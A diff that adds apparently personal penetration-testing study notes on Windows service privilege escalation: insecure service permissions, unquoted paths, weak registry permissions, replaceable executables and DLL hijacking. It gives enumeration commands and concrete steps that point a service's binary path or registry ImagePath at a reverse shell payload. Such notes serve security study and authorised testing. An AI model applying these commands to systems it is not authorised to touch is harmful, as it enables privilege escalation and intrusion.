@@ -1,1 +1,73 @@
+SERVICE EXPLOITS
+
+#################################### INSECURE SERVICE PERMISSIONS ####################################
+USEFUL PERMISSIONS: SERVICE_STOP/START, SERVICE_CHANGE_CONFIG, SERVICE_ALL_ACCESS.
+RABBIT HOLE: if we can change service config, but cannot stop/start service.
+ENUMERATION INFO: .\winpeasany.exe quiet servicesinfo
+ANALYSIS WINPEAS OUTPUT: modifiable services; VERIFICATION: .\accesscheck.exe /accepteula -uwcqv [servicename]
+SERVICE CONFIGURATION INFO: sc qc [servicename]
+STATE OF THE SERVICE: sc query [servicename]
+SET SERVICE 'BINARY_PATH' TO REVERSE SHELL PAYLOAD: sc config [servicename] binpath="\"PATH_TO_REVERSE_SHELL\""
+START/STOP SERVICE: net start/stop [servicename]
+
+#################################### UNQUOTED SERVICE PATH ###########################################
+Executables in windows can be run without using their extension (e.g. "whoami.exe" can be run "whoami").
+Some executables take arguments separated by spaces.
+EXAMPLE: C:\Program Files\Some Dir\SomeProgram.exe, in this example "C:\Program" and "C:\Program Files\Some" can be the executable.
+WINPEAS OUTPUT ENUMERATION: No quotes and Spaces detected.
+VERIFICATION: .\accesscheck.exe /accepteula -ucqv user [servicename]
+CHECK FOR WRITE PERMISSIONS IN SERVICE PATH: .\accesscheck.exe /accepteula -uwdq C:\, "C:\Program Files\" (RW BUILTIN\Users)
+EXPLOITATION: replace part of dir name with reverse shell and start the service. cope reverseshell.exe "UNQUOTED PATH".
+
+#################################### WEAK REGISTRY PERMISSIONS ########################################
+The Windows registry stores entries for each service. We can modify a service's configuration even if we cannot modify the service directly.
+ANALYSIS WINPEAS OUTPUT: modify registry of a service.
+VERIFICATION WITH POWERSHELL:
+- powershell -exec bypass
+- Get-Acl HKLM\...\[registry service name] | Format-List
+VERIFICATION WITH ACCESSCHECK: .\accesscheck.exe /accepteula -uvwqk HKLM\...\[registry service name].
+REGISTRY INFO: reg query HKLM\...\[registry service name]
+OVERWRITE ERVICE IMAGEPATH BINARIES: reg add HKLM\...\[registry service name] /v ImagePath /t REG_EXPAND_SZ /d C:\path_to_reverseshell.exe /f.
+START THE SERVICE.
+
+#################################### INSECURE SERVICE EXECUTABLES ######################################
+ANALYSIS WINPEAS OUTPUT: file permission service
+EXPLOITATION: replace file with reverseshell.exe and start service.
+
+#################################### DLL HIJACKING #####################################################
+FIND DLL SERVICE, CHECK PERMISSIONS (START/STOP), COPY SERVICE THAT HAVE DLL ON LOCAL HOST AND ANALYZE WITH procmon, we need find file with result NAME_NOT_FOUND.
+GENERATE REVERSE SHELL, TRANSFER ON WINDOWS MACHINE, PLACE IN DIR WHERE SERVICE SEARCH DLL, START SERVICE.
+------------------------------------------------------------------------------------------------------------------------------------------------------------------
+REGISTRY
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
